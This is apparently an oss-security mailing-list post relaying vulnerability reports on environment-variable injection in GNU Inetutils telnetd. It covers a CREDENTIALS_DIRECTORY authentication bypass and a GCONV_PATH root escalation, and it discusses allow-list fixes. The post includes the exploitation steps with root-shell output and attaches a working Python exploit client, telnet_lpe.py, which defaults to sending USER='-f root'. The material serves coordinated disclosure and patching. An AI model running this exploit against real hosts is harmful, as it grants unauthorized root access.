Received: (qmail 16272 invoked by uid 550); 24 Feb 2026 05:33:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 1714 invoked from network); 24 Feb 2026 05:30:05 -0000
Date: Tue, 24 Feb 2026 06:29:43 +0100
From: Solar Designer <solar@openwall.com>
To: Justin Swartz <justin.swartz@risingedge.co.za>
Cc: bug-inetutils@gnu.org, oss-security@lists.openwall.com,
	ron.benyizhak@safebreach.com, simon@josefsson.org,
	auerswal@unix-ag.uni-kl.de
Message-ID: <20260224052943.GA13045@openwall.com>
References: <CAB1hGqQwnSzEqtrefwqAxD+rWGu_EXVDmu-btMrNYqMzkzc9Kw@mail.gmail.com> <20260206172730.GA12303@unix-ag.uni-kl.de> <877bso8mhf.fsf@josefsson.org> <20260224011702.27987-1-justin.swartz@risingedge.co.za>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="azLHFNyN32YCQGCU"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260224011702.27987-1-justin.swartz@risingedge.co.za>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Telnetd Vulnerability Report

--azLHFNyN32YCQGCU
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit

Hi,

Thank you for bringing this to oss-security, Justin!

On Tue, Feb 24, 2026 at 03:17:02AM +0200, Justin Swartz wrote:
> I have been reviewing the recent vulnerability report by Ron Ben Yizhak regarding CREDENTIALS_DIRECTORY, as well as commit 4db2f19f which introduces unsetenv("CREDENTIALS_DIRECTORY") to address the problem.

Looks like this wasn't reported to oss-security yet, so let me do that
now.  Ron Ben Yizhak's report is here:

https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00000.html

and I quote it in full below:

> From: 	Ron Ben Yizhak
> Subject: 	Telnetd Vulnerability Report
> Date: 	Thu, 5 Feb 2026 14:39:57 +0200
> 
> Hello,
> 
> My name is Ron Ben Yizhak and I am a security researcher from SafeBreach.
> 
> I want to report a severe vulnerability that I found in telnetd from the repository https://codeberg.org/inetutils/inetutils
> 
> After the vulnerability CVE-2026-24061 was fixed, it was no longer possible to force telnetd to execute /usr/bin/login with the parameter -f and skip the authentication. However the research on CVE-2026-24061 revealed that telnetd allows clients to set environment variables for the telnetd process itself and for all its sub processes. One of its processes as we know from CVE-2026-24061, is /usr/bin/login.
> 
> This is the root cause of the vulnerability I’m reporting to you. Setting environment variables as a remote telnet client enables us to spawn /usr/bin/login with the environment variable “CREDENTIALS_DIRECTORY”. This will make the process search for a file named “login.noauth” in the directory specified by “CREDENTIALS_DIRECTORY”. If the file contains the string “yes”, login will skip the authentication and provide a shell for the client running as the user the client specified. It can be any user, even root.
> 
> https://github.com/util-linux/util-linux/blob/master/login-utils/login.c#L1306
> 
> Attached to this mail is a video demonstrating the vulnerability on a fully patched ubuntu 25 machine with the latest telnetd. Also attached is a script to test this vulnerability
> 
> Usage:
> 
> 1. create a directory as a low privileged user, for example /home/weak_user/fake_cred
> 
> 2. create a file named login.noauth containing the string “yes” inside this directory
> 
> 3. launch the python script with the following parameters
> 
> ./telnet_lpe.py 127.0.0.1 --env CREDENTIALS_DIRECTORY=/home/weak_user/fake_cred --env USER=root
> 
> Best regards,
> Ron Ben Yizhak
> 
> Attachment: telnet_lpe.py
> Description: Text Data
> 
> Attachment: telnet_lpe_demo.mp4
> Description: video/mp4

I'm re-attaching telnet_lpe.py, but not the video.

On Tue, Feb 24, 2026 at 03:17:02AM +0200, Justin Swartz wrote:
> After becoming aware of CVE-2026-24061 (telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a "-f root" value for the USER environment variable), I was curious to find out whether there'd also been a potential regression of CVE-1999-0073, described as: telnet allows a remote client to specify environment variables including LD_LIBRARY_PATH, allowing an attacker to bypass the normal system libraries and gain root access. I can confirm that this is still an issue 27 years later, despite attempts at blacklisting environment variables by prefix or full name.
> 
> The problem stems from telnetd executing /bin/login in a root-to-root context, which means that AT_SECURE is set to 0 by the kernel in the process's auxiliary vector. When AT_SECURE holds a positive value, it informs the dynamic linker (ld-linux.so) and libc to enter a "secure-execution mode" where a bunch of interesting environment variables are discarded or, at least, defanged if present. In other words, the responsibility is on telnetd itself to ensure that none of those potentially interesting, and attacker controlled, variables make their way to /bin/login.
> 
> While using unsetenv() negates a user's ability to exploit the login.noauth vector, the possibility still exists for the inclusion of variables of interest to GNU gettext (such as OUTPUT_CHARSET or LANGUAGE) and glibc (such as GCONV_PATH) via the telnet protocol itself.
> 
> For example, by injecting OUTPUT_CHARSET and LANGUAGE, an attacker can persuade gettext that a character set conversion is necessary. This forces gettext to call libc's iconv_open(), and because AT_SECURE is 0, iconv_open() will use an injected GCONV_PATH in its quest for a gconv-modules file. Assuming the attacker already has a local unprivileged account, or at least a means of uploading files to the host (and knowing the location of the uploaded files), a custom gconv-modules file will allow arbitrary shared objects to be loaded soon after /bin/login attempts to print a localized prompt.
> 
> For proof of concept, I've declared a broad selection of LANGUAGE codes for the best chance of matching an installed locale. An attacker with local access could simply determine what's actually installed and select only one that doesn't match the system's default locale instead. Similarly, OUTPUT_CHARSET has been chosen as a deliberate mismatch against the very common choice of UTF-8:
> 
>   abuser@prospecton.hyperama:~$ ls -al .gconv
>   total 184
>   drwxr-xr-x 2 abuser abuser   4096 Jan  1  1970 .
>   drwxr-x--- 5 abuser abuser  36864 Jan  1  1970 ..
>   -rw-r--r-- 1 abuser abuser    256 Jan  1  1970 gconv-modules
>   -rw-r--r-- 1 abuser abuser  15568 Jan  1  1970 libcash2trash.so
> 
> 
>   abuser@prospecton.hyperama:~$ telnet -l abuser
>   telnet> environ define GCONV_PATH /home/abuser/.gconv
>   telnet> environ export GCONV_PATH
>   telnet> environ define LANGUAGE fr:de:es:it:pt:nl:sv:pl:uk:ru:zh_CN:ko:ja
>   telnet> environ export LANGUAGE
>   telnet> environ define OUTPUT_CHARSET ISO-8859-1
>   telnet> environ export OUTPUT_CHARSET
>   telnet> open 127.0.0.1
>   Trying 127.0.0.1...
>   Connected to 127.0.0.1.
>   Escape character is '^]'.
>   
>   Linux (localhost) (pts/6)
>   
>   Connection closed by foreign host.
> 
> 
>   abuser@prospecton.hyperama:~$ ls -al .gconv
>   total 184
>   drwxr-xr-x 2 abuser abuser   4096 Jan  1  1970 .
>   drwxr-x--- 5 abuser abuser  36864 Jan  1  1970 ..
>   -rw-r--r-- 1 abuser abuser    256 Jan  1  1970 gconv-modules
>   -rw-r--r-- 1 abuser abuser  15568 Jan  1  1970 libcash2trash.so
>   -rwsr-sr-x 1 root   root   125640 Jan  1  1970 trash
> 
> 
>   abuser@prospecton.hyperama:~$ .gconv/trash -p
>   # id
>   uid=1001(abuser) gid=1002(abuser) euid=0(root) egid=0(root) groups=0(root),1002(abuser)
> 
> 
> Once the telnet connection opens, /bin/login tries to print the localized prompt but gettext recognizes the encoding mismatch and calls iconv_open() to parse the gconv-modules file in the directory referenced by the injected path before loading the shared object that turns cash ($) to trash (#). The connection drops because I included a call to exit() once the payload has executed. As illustrated above, the payload effectively asserts root privilege and makes a copy of /bin/sh with SUID/SGID permissions. Note that no authentication via telnetd was required, nor performed, for this privilege escalation trick to occur. Also note that this is just one of many possible methods that may be used to exploit this condition.
> 
> In my opinion, to fix this issue and finally put the ghost of CVE-1999-0073 to rest: telnetd must drop the blacklist approach and adopt the OpenSSH AcceptEnv-style approach suggested by Simon Josefsson [1], which amounts to preparing a brand new environment for /bin/login based on a strict whitelist of variables names considered to be "safe", and perhaps a healthy dose of input sanitization for their respective values.

Oh, sure.  A couple of decades ago I ported OpenBSD's telnet and telnetd
to Linux for our distro, Owl.  I no longer recalled all detail, but
looking at my "Linux port" patch now, it appears to implement a strict
allow-list approach already.  There's a comment saying the "list comes
from Linux NetKit telnetd, version 0.17", so maybe NetKit already used
that approach too, and Linux distros got a regression by switching from
NetKit to InetUtils?  Or it could be that Red Hat used NetKit and Debian
went with InetUtils.  I see I'm also lightly sanitizing env var values
(only for not containing '/' and being of sane length), which I doubt
was in NetKit.

My very first RPM changelog entry was:

* Sat Nov 17 2001 Solar Designer <solar-at-owl.openwall.com>
- Ported the telnet client and server from OpenBSD-current (post-3.0),
reviewing changes made in NetBSD-current, FreeBSD-current, and Linux
NetKit 0.17.
- Filter environment variables in telnetd with a white list (took the
list itself from NetKit), but also use a black list for logging likely
attacks.
- Dropped the "mini inetd" from telnetd.
- Dropped Kerberos-related pieces from the man pages (the telnet stuff
is already bad enough, let's better not add to that).
- Wrote telnetd.xinetd.
- Wrote this spec file, based (sub)package descriptions on Red Hat's.

So at least OpenBSD was at risk, relying on their badenv_table being
comprehensive.  Probably other *BSDs too.

Perhaps non-Linux systems that still have telnetd also still have this
weakness, and you could find specific env vars/values that would work
for them?

There was also a symmetric problem where a malicious server could
request arbitrary env vars from the telnet client, obtaining sensitive
information.  This too was promptly fixed in my port:

* Wed Nov 21 2001 Solar Designer <solar-at-owl.openwall.com>
[...]
- Added a Red Hat Linux derived patch to the telnet client such that it
permits queries for exported variables only.

... so apparently it had been fixed in Red Hat Linux, but not *BSDs.

Further, I implemented privsep:

* Sun Nov 25 2001 Solar Designer <solar-at-owl.openwall.com>
- Do telnet protocol handling as a dedicated pseudo-user and in a chroot
jail.  This uses the approach introduced by Chris Evans in his NetKit
telnetd patches, but the code is different.

Architecture diagram:

https://www.openwall.com/presentations/Owl/mgp00017.html

Patches against OpenBSD telnet/telnetd:

https://github.com/openwall/Owl/tree/main/packages/telnet

Tarball with the OpenBSD code to be patched:

https://download.openwall.net/pub/Owl/pool/sources/telnet/

This can be revitalized and used to replace the code currently in
InetUtils if anyone is willing to invest significant time into that.

> In terms of the CVE that Ron Ben Yizhak had asked about earlier in the thread: I think it might make the most sense to co-ordinate a single CVE for "Improper environment sanitization in telnetd" that comprehensively covers both the CREDENTIALS_DIRECTORY vector and this dynamic linker escape.

So essentially a new CVE for improper/incomplete fix of CVE-1999-0073,
emphasizing that only an allow list is considered a proper fix of the
new CVE.  Makes sense to me.

> I'm happy to share the intentionally redacted payload privately with the maintainers should any help be required to reproduce the proof of concept.
> 
> Regards,
> Justin
> 
> ---
> 
> [1] https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00002.html

Thank you both for taking a fresh look and sharing these findings.

Alexander

--azLHFNyN32YCQGCU
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="telnet_lpe.py"
Content-Transfer-Encoding: 8bit

#!/usr/bin/python3
import socket
import sys
import threading
import time
import argparse
import re

# --- Telnet Protocol Constants (RFC 854) ---
# These constants represent the specific byte values used in Telnet's 
# "Interpret As Command" (IAC) sequences.
IAC  = 255  # Interpret As Command: Signals the start of a control sequence
DONT = 254  # Negotiation: Refuse to perform, or request that the other party stop
DO   = 253  # Negotiation: Request that the other party perform, or confirm you expect it
WONT = 252  # Negotiation: Refusal to perform
WILL = 251  # Negotiation: Agreement to perform
SB   = 250  # Subnegotiation Begin: Start of a complex multi-byte option negotiation
SE   = 240  # Subnegotiation End: End of the subnegotiation block

# --- Telnet Option Codes (RFC 1572) ---
# Specifically for handling environment variable passing.
NEW_ENVIRON = 39 
IS    = 0
VAR   = 0
VALUE = 1

# --- Global State for Output Filtering ---
# Use a flag to track when we are waiting for the echoed command to finish.
waiting_for_newline = False
state_lock = threading.Lock()

def parse_arguments():
    """
    Handles command-line argument parsing.
    
    Returns:
        argparse.Namespace: Object containing 'host' and 'port'.
    """
    parser = argparse.ArgumentParser(
        description='Telnet exploit script for the NEW-ENVIRON vulnerability.'
    )
    parser.add_argument('host', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=23, help='Target port (default 23)')
    parser.add_argument(
        '--env',
        action='append',
        default=[],
        metavar='NAME=VALUE',
        help='Environment variable to send using NEW-ENVIRON. '
             'Can be specified multiple times, e.g. --env USER=-froot --env PATH=/tmp'
    )
    
    return parser.parse_args()


def handle_negotiation(sock, cmd, opt):
    """
    Handles standard 3-byte Telnet negotiation sequences.
    
    Args:
        sock: The active socket object.
        cmd: The negotiation command (DO, WILL, etc).
        opt: The specific Telnet option (e.g., NEW_ENVIRON).
    """
    if cmd == DO and opt == NEW_ENVIRON:
        # If server says "DO NEW_ENVIRON", we reply "WILL NEW_ENVIRON"
        sock.sendall(bytes([IAC, WILL, NEW_ENVIRON]))
    elif cmd == DO:
        # Refuse other options to keep the connection simple
        sock.sendall(bytes([IAC, WONT, opt]))
    elif cmd == WILL:
        # Acknowledge that the server will perform an option
        sock.sendall(bytes([IAC, DO, opt]))


def handle_subnegotiation(sock, sb_data, env_vars):
    """
    Handles Telnet subnegotiation (SB) sequences for environment variables.
    
    This is the core of the exploit: when the server requests environment
    information, we provide one or more environment variables of our choosing.
    """
    if len(sb_data) > 0 and sb_data[0] == NEW_ENVIRON:
        # Build: IAC SB NEW_ENVIRON IS [VAR name VALUE value]... IAC SE
        env_msg = bytes([IAC, SB, NEW_ENVIRON, IS])

        for name, value in env_vars:
            # Ensure everything is ASCII-safe for the Telnet payload
            name_bytes = str(name).encode('ascii', errors='ignore')
            value_bytes = str(value).encode('ascii', errors='ignore')
            env_msg += bytes([VAR]) + name_bytes + bytes([VALUE]) + value_bytes

        env_msg += bytes([IAC, SE])
        sock.sendall(env_msg)


def process_telnet_stream(data, sock, env_vars):
    """
    Separates Telnet control sequences from displayable text.
    Also filters ANSI escape sequences and suppresses command echos.
    
    Returns:
        bytes: Filtered data intended for the user's terminal.
    """
    global waiting_for_newline
    clean_output = b''
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            
            # 3-byte command (IAC + CMD + OPT)
            if cmd in [DO, DONT, WILL, WONT] and i + 2 < len(data):
                handle_negotiation(sock, cmd, data[i + 2])
                i += 3
            # Variable-length Subnegotiation block
            elif cmd == SB:
                se_idx = i + 2
                while se_idx < len(data) - 1:
                    if data[se_idx] == IAC and data[se_idx + 1] == SE:
                        break
                    se_idx += 1
                
                if se_idx < len(data) - 1:
                    handle_subnegotiation(sock, data[i + 2:se_idx], env_vars)
                    i = se_idx + 2
                else:
                    i += 1
            else:
                i += 2
        else:
            clean_output += bytes([data[i]])
            i += 1

    # 1. Filter out ANSI escape sequences (e.g., ←[?2004h, ←[3244ms)
    ansi_escape = re.compile(rb'\x1b\[[0-?]*[ -/]*[@-~]')
    filtered_data = ansi_escape.sub(b'', clean_output)

    # 2. Suppress the echoed command
    # We ignore incoming data until we see a newline (\n or \r) after a command is sent.
    with state_lock:
        if waiting_for_newline:
            newline_pos = -1
            for idx, byte_val in enumerate(filtered_data):
                if byte_val in [10, 13]:  # LF or CR
                    newline_pos = idx
                    break
            
            if newline_pos != -1:
                # Found the newline; discard everything before it and resume output
                filtered_data = filtered_data[newline_pos + 1:]
                waiting_for_newline = False
            else:
                # Newline not found yet; skip this entire block of data
                return b''

    return filtered_data


def socket_reader_thread(sock, env_vars):
    """Background listener for server traffic."""
    try:
        while True:
            raw_data = sock.recv(4096)
            if not raw_data:
                break
            display_data = process_telnet_stream(raw_data, sock, env_vars)
            if display_data:
                sys.stdout.buffer.write(display_data)
                sys.stdout.buffer.flush()
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print("\n[*] Connection closed.")


def main():
    args = parse_arguments()
    # Parse env vars from CLI. Expected format: NAME=VALUE
    env_vars = []
    for item in args.env:
        if '=' in item:
            name, value = item.split('=', 1)
            env_vars.append((name, value))
        else:
            # If no "=", treat the whole string as the variable name with empty value
            env_vars.append((item, ''))

    # Backwards-compatible default: if no env vars specified, send USER with original payload
    if not env_vars:
        env_vars.append(('USER', '-f root'))
    global waiting_for_newline

    try:
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.settimeout(5)
        client_sock.connect((args.host, args.port))
        client_sock.settimeout(None)
        print(f"[*] Connected to {args.host}:{args.port}")
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    threading.Thread(
        target=socket_reader_thread, 
        args=(client_sock, env_vars), 
        daemon=True
    ).start()

    print("[*] Interactive session started. Use Ctrl+C to quit.\n")
    try:
        while True:
            char = sys.stdin.buffer.read(1)
            if not char:
                break
            
            if char[0] in [10, 13]:
                with state_lock:
                    waiting_for_newline = True
            
            client_sock.sendall(char)
    except KeyboardInterrupt:
        print("\n[*] Session ended.")
    finally:
        client_sock.close()

if __name__ == "__main__":
    main()

--azLHFNyN32YCQGCU--
